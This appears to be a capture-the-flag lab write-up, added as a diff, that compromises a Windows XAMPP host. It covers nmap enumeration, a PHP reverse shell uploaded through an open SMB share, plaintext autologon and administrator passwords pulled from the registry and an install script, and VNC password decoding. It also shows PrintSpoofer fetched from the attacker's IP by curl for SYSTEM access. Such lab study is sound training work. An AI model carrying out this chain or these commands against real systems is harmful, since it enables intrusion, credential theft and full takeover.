@@ -1,0 +1,392 @@
+AllSignsPoint2Pwnage
+
+NMAP RESULTS:
+----------------
+
+Nmap scan report for 10.10.102.107
+Host is up, received echo-reply ttl 127 (0.18s latency).
+Scanned at 2021-06-12 10:48:39 EDT for 190s
+
+PORT      STATE SERVICE        REASON          VERSION
+21/tcp    open  ftp            syn-ack ttl 127 Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_11-14-20  04:26PM                  173 notice.txt
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp    open  http           syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+| http-methods: 
+|   Supported Methods: OPTIONS HEAD GET POST TRACE
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
+|_http-title: Simple Slide Show
+135/tcp   open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+139/tcp   open  netbios-ssn    syn-ack ttl 127 Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http       syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1g PHP/7.4.11)
+|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1g PHP/7.4.11
+|_http-title: Simple Slide Show
+| ssl-cert: Subject: commonName=localhost
+| Issuer: commonName=localhost
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2009-11-10T23:48:47
+| Not valid after:  2019-11-08T23:48:47
+| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
+| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
+| -----BEGIN CERTIFICATE-----
+| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
+| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
+| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
+| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
+| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
+| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
+| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
+| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
+| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
+|_-----END CERTIFICATE-----
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+445/tcp   open  microsoft-ds?  syn-ack ttl 127
+3389/tcp  open  ms-wbt-server? syn-ack ttl 127
+| rdp-ntlm-info: 
+|   Target_Name: DESKTOP-997GG7D
+|   NetBIOS_Domain_Name: DESKTOP-997GG7D
+|   NetBIOS_Computer_Name: DESKTOP-997GG7D
+|   DNS_Domain_Name: DESKTOP-997GG7D
+|   DNS_Computer_Name: DESKTOP-997GG7D
+|   Product_Version: 10.0.18362
+|_  System_Time: 2021-06-12T14:51:45+00:00
+| ssl-cert: Subject: commonName=DESKTOP-997GG7D
+| Issuer: commonName=DESKTOP-997GG7D
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2021-01-31T18:46:06
+| Not valid after:  2021-08-02T18:46:06
+| MD5:   d1e4 d8ce c27e f320 bce5 7c68 419b 9643
+| SHA-1: 0deb 19c3 f73b 8076 c441 be8c 70c6 573c e264 03a6
+| -----BEGIN CERTIFICATE-----
+| MIIC4jCCAcqgAwIBAgIQPfZxdAS+HKNL+id10EeMKTANBgkqhkiG9w0BAQsFADAa
+| MRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwHhcNMjEwMTMxMTg0NjA2WhcNMjEw
+| ODAyMTg0NjA2WjAaMRgwFgYDVQQDEw9ERVNLVE9QLTk5N0dHN0QwggEiMA0GCSqG
+| SIb3DQEBAQUAA4IBDwAwggEKAoIBAQCkdIFrbwCkV+QStYp75HfvS9j38xvFtmvO
+| xGkaCWjA+oNW0itBR/t+CP+BLbAPW6qqt17pCs9I49ovz0PgGZ/j0FP8IJs4mi9g
+| aWDerGM6cNgwagk28VpVutTYkvhHlJjPeT9CMxLLTCR5gERyuxB0LeqpV8XoBlgB
+| zY/IrMnO7eaiYJNnp1cZFHtNEVNJK0Z5w4HaHSfhU7k9r3MNE6ldkjuMNrgElZya
+| a1VgcKSB7GK5J9cyG3R+dxwBrvgaW/sjau2MmB5gNm1jye+ntk1/h5sWXYAb6rf2
+| T+OFdPTD+A6m1azV1lQO5qNCiRq826PBfK4MoZii9m3hebxp7JchAgMBAAGjJDAi
+| MBMGA1UdJQQMMAoGCCsGAQUFBwMBMAsGA1UdDwQEAwIEMDANBgkqhkiG9w0BAQsF
+| AAOCAQEAOR8rz9/N2K2z2O+Ll+ImMgmNoBbg577vjdur7sqKnLtf120LTc6VBFgx
+| eBbNQi5vQsRz/Oykfoz9QQEdiZCIunn+10/o0715Mn80l2eQntRHHvwLDHNi4txM
+| J5A7MUreuJccp4UmkrW2IRY9wmg2CZfCIMbpoyg/L3yoBblydZH/VGwU6FFd1dE2
+| KzuZ8F7EJ2yAg+Z6D9CawHgKLQLOeVHz0MbMQ7mwPQ3NMsKG3MpyLuGDrE30PBSD
+| Ss8Cs4rclhW9RLUVcif4sYhC75gm0vXlCqHzoFrXeUg8AHas8FpQsGtz75urOqn+
+| 3xHEbjlSAlD0kpQ4eGxd83YU9SbnQA==
+|_-----END CERTIFICATE-----
+|_ssl-date: 2021-06-12T14:51:56+00:00; +12s from scanner time.
+5040/tcp  open  unknown        syn-ack ttl 127
+5900/tcp  open  vnc            syn-ack ttl 127 VNC (protocol 3.8)
+| vnc-info: 
+|   Protocol version: 3.8
+|   Security types: 
+|     Ultra (17)
+|_    VNC Authentication (2)
+49664/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49665/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49666/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49667/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49668/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49670/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+49677/tcp open  msrpc          syn-ack ttl 127 Microsoft Windows RPC
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (96%), Microsoft Windows Longhorn (95%), Microsoft Windows 10 1709 - 1803 (93%), Microsoft Windows 10 1809 - 1909 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows 10 1703 (93%), Microsoft Windows Server 2008 R2 (93%), Microsoft Windows Server 2008 SP2 (93%), Microsoft Windows 7 SP1 (93%), Microsoft Windows 8.1 Update 1 (93%)
+No exact OS matches for host (test conditions non-ideal).
+TCP/IP fingerprint:
+SCAN(V=7.91%E=4%D=6/12%OT=21%CT=%CU=38182%PV=Y%DS=2%DC=T%G=N%TM=60C4CA05%P=x86_64-pc-linux-gnu)
+SEQ(SP=106%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S%TS=U)
+OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505NW8NNS%O6=M505NNS)
+WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
+ECN(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=N%Q=)
+T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)
+T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)
+T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
+T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
+T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
+U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
+IE(R=Y%DFI=N%T=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=263 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 11s, deviation: 0s, median: 11s
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 36674/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 12275/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 38060/udp): CLEAN (Timeout)
+|   Check 4 (port 24155/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-06-12T14:51:42
+|_  start_date: N/A
+
+TRACEROUTE (using port 443/tcp)
+HOP RTT       ADDRESS
+1   157.63 ms 10.8.0.1
+2   181.32 ms 10.10.102.107
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 10:51
+Completed NSE at 10:51, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 10:51
+Completed NSE at 10:51, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 10:51
+Completed NSE at 10:51, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 192.63 seconds
+           Raw packets sent: 63 (4.176KB) | Rcvd: 60 (3.796KB)
+
+
+
+## CHECKING THE FTP SHARE:
+---------------------------
+
+# cat notice.txt 
+NOTICE
+======
+
+Due to customer complaints about using FTP we have now moved 'images' to 
+a hidden windows file share for upload and management 
+of images.
+
+- Dev Team
+
+## CHECKING SMB SHARES:
+-------------------------
+
+# smbclient -L //10.10.102.107
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	images$         Disk      
+	Installs$       Disk      
+	IPC$            IPC       Remote IPC
+	Users           Disk      
+SMB1 disabled -- no workgroup available
+
+## THIS 'IMAGES' DIRECTORY SHOULD BE INTERESTING ACCORDING TO THE NOTE WE GET FROM FTP SHARE
+---------------------------------------
+
+# smbclient //10.10.102.107/images$
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Tue Jan 26 13:19:19 2021
+  ..                                  D        0  Tue Jan 26 13:19:19 2021
+  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
+  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
+  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
+  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
+
+		10861311 blocks of size 4096. 4141914 blocks available
+
+## MAYBE WE CAN UPLOAD OUR MALICIOUS IMAGE THROUGH SMB SHARE
+
+## AFTER ENUMERATING THE PORT 80, I FIND A PAGE 'content.php' WHICH HAVE THE NAMES OF THESE IMAGES WE FOUND IN THE SMB SHARES IN A JSON FORMAT
+
+## LETS USE GOBUSTER TO FIND ANY OTHER PHP PAGES
+----------------------------------------------------
+/images               (Status: 301) [Size: 340] [--> http://10.10.102.107/images/]
+/img                  (Status: 301) [Size: 337] [--> http://10.10.102.107/img/]   
+/Images               (Status: 301) [Size: 340] [--> http://10.10.102.107/Images/]
+/content.php          (Status: 200) [Size: 187]                                   
+/Content.php          (Status: 200) [Size: 187]                                   
+/examples             (Status: 503) [Size: 403]                                   
+/licenses             (Status: 403) [Size: 422]      
+
+## CHECKING THE /DASHBOARD, WE GOT TO KNOW ABOUT THE XAMPP WITH WINDOWS
+Welcome to XAMPP for Windows 7.4.11
+
+
+## I FOUND OUT THE REVERSE SHELL WHICH IS COMPATIBLE TO THE XAMPP+WINDOWS
+
+## FIND OUT THE /IMAGES DIRECTORY LISTING
+
+## UPLOADING OUR MALICIOUS PHP PAYLOAD:
+----------------------------------------
+
+smb: \> put ../rev_xammp.php 
+putting file ../rev_xammp.php as \rev_xammp.php (11.1 kb/s) (average 1.2 kb/s)
+smb: \> ls
+  .                                   D        0  Sat Jun 12 12:12:09 2021
+  ..                                  D        0  Sat Jun 12 12:12:09 2021
+  internet-1028794_1920.jpg           A   134193  Sun Jan 10 16:52:24 2021
+  man-1459246_1280.png                A   363259  Sun Jan 10 16:50:49 2021
+  monitor-1307227_1920.jpg            A   691570  Sun Jan 10 16:50:29 2021
+  neon-sign-4716257_1920.png          A  1461192  Sun Jan 10 16:53:59 2021
+  rev_xammp.php                       A     9291  Sat Jun 12 12:12:09 2021
+
+		10861311 blocks of size 4096. 4148010 blocks available
+smb: \> 
+
+
+## GOT THE REVERSE SHELL:
+---------------------------
+
+# nc -nvlp 9001
+listening on [any] 9001 ...
+connect to [10.8.73.218] from (UNKNOWN) [10.10.232.199] 49858
+SOCKET: Shell has connected! PID: 5260
+Microsoft Windows [Version 10.0.18362.1256]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\images>
+
+
+## GOT THE USER FLAG ##
+
+## NOW WE HAVE TO FIND THE USER PASSWORD;
+The following question was what the users password is. The included hint told us that the user is automatically logging in. Nice! So we know that the password is stored in plain text in a registry key.
+
+As we only using the command line we´re not able to use regedit.exe but we can use reg query to look up registry entries.
+
+reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
+
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
+    AutoRestartShell    REG_DWORD    0x1
+    Background    REG_SZ    0 0 0
+    CachedLogonsCount    REG_SZ    10
+    DebugServerCommand    REG_SZ    no
+    DisableBackButton    REG_DWORD    0x1
+    EnableSIHostIntegration    REG_DWORD    0x1
+    --[snip]--
+    LastUsedUsername    REG_SZ    .\sign
+    DefaultUsername    REG_SZ    .\sign
+    DefaultPassword    REG_SZ    gKY1uxHLuU1zzlI4wwdAcKUw35TPMdv7PAEE5dAFbV2NxpPJVO7eeSH
+    AutoAdminLogon    REG_DWORD    0x1
+    ARSOUserConsent    REG_DWORD    0x0
+
+
+## LETS SEARCH FOR ADMIN PASSWORD;
+-------------------------------------
+in installs folder:
+
+type Install_www_and_deploy.bat
+@echo off
+REM Shop Sign Install Script 
+cd C:\Installs
+psexec -accepteula -nobanner -u administrator -p RCYCc3GIjM0v98HDVJ1KOuUm4xsWUxqZabeofbbpAss9KCKpYfs2rCi xampp-windows-x64-7.4.11-0-VC15-installer.exe   --disable-components xampp_mysql,xampp_filezilla,xampp_mercury,xampp_tomcat,xampp_perl,xampp_phpmyadmin,xampp_webalizer,xampp_sendmail --mode unattended --launchapps 1
+xcopy C:\Installs\simepleslide\src\* C:\xampp\htdocs\
+move C:\xampp\htdocs\index.php C:\xampp\htdocs\index.php_orig
+copy C:\Installs\simepleslide\src\slide.html C:\xampp\htdocs\index.html
+mkdir C:\xampp\htdocs\images
+UltraVNC_1_2_40_X64_Setup.exe /silent
+copy ultravnc.ini "C:\Program Files\uvnc bvba\UltraVNC\ultravnc.ini" /y
+copy startup.bat "c:\programdata\Microsoft\Windows\Start Menu\Programs\Startup\"
+pause
+
+
+## LETS FIND THE VNC PASSWORD, WHICH IS STORED IN THE VNC CONFIG FILE:
+
+type ultravnc.ini
+[ultravnc]
+passwd=B3A8F2D8BEA2F1FA70
+passwd2=5AB2CDC0BADCAF13F1
+[admin]
+
+
+## USING THE TOOL VNCPWD.EXE:
+--------------------------------
+# wine vncpwd.exe B3A8F2D8BEA2F1FA70
+
+*VNC password decoder 0.2.1
+by Luigi Auriemma
+e-mail: aluigi@autistici.org
+web:    aluigi.org
+
+- your input password seems in hex format (or longer than 8 chars)
+
+  Password:   5upp0rt9
+
+  Press RETURN to exit
+
+
+## LETS ESCALATE OUR PRIVILEGES:
+-----------------------------------
+
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+C:\Installs>
+
+
+## "SeImpersonatePrivilege" IS ENABLE, PrintSpoofer.exe TIME!!!
+
+## UPLOAD "PrintSpoofer.exe" ON THE SERVER, THEN RUN ;
+---------------------------------------------------
+
+powershell -c curl 10.8.73.218/PrintSpoofer.exe -o hello.exe
+
+hello -i -c cmd
+[+] Found privilege: SeImpersonatePrivilege
+[+] Named pipe listening...
+[+] CreateProcessAsUser() OK
+Microsoft Windows [Version 10.0.18362.1256]
+(c) 2019 Microsoft Corporation. All rights reserved.
+
+whoami
+nt authority\system
+
+C:\Windows\system32>
+
+## YOU WILL BECOME ROOT
+
+## ANOTHER METHOD:
+---------------------
+
+USE "IMPACKET-WMIEXEC", AS WE ALREADY GET THE ADMIN PWD
+
+# impacket-wmiexec administrator@10.10.232.199
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+desktop-997gg7d\administrator
+
+C:\>
